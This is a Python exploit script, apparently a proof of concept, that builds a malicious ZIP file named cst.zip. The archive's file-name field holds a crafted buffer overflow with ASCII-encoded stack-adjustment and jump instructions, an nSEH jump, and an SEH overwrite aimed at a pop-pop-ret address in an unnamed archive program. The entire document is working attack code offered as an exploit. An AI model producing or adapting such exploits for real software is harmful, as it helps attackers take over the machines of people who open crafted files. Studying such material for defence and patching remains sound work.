#!/usr/bin/python

header_1 = ("\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00")

header_2 = ("\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00\x00\x00\x00\x01\x00"
"\x24\x00\x00\x00\x00\x00\x00\x00")

header_3 = ("\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
"\x12\x10\x00\x00\x02\x10\x00\x00\x00\x00")

print "[+] Building PoC.."

max_size = 4064

longJump  = "\x54\x5b" # Are Ascii safe so no need to encode
longJump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
longJump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
longJump += "\x05\x11\x77\x62\x41" ## add  eax, 0x41627711
longJump += "\x05\x12\x66\x52\x41" ## add  eax, 0x41526612
longJump += "\x05\x11\x55\x62\x41" ## add  eax, 0x41625511
longJump += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
longJump += "\x50"                 ## push eax
longJump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
longJump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
longJump += "\x05\x33\x41\x76\x13" ## add  eax, 0x13764133
longJump += "\x05\x33\x40\x75\x13" ## add  eax, 0x13754033
longJump += "\x50"                 ## push eax

espAdj = "\x54\x58\x66\x05\x7F\x03\x66\x05\x4C\x04\x50\x5C"

nSeh = "\x74\x9F\x75\x9F"      # NetJump - JE and JNE
Seh  = "\x33\x7a\x40\x00"      # pop pop ret  #  - ascii pop pop ret - 0x00407a33

payload  = "A" * 174
payload += espAdj
payload += longJump
payload += "A" * (297 - len(payload))
payload += nSeh
payload += Seh
payload += "D" * (max_size - len(payload))
payload += ".txt"

print "[+] Length = " + str(len(payload))

exploit = header_1 + payload + header_2 + payload + header_3

mefile = open('cst.zip','w');
mefile.write(exploit);
mefile.close()

print "[+] Exploit complete!"
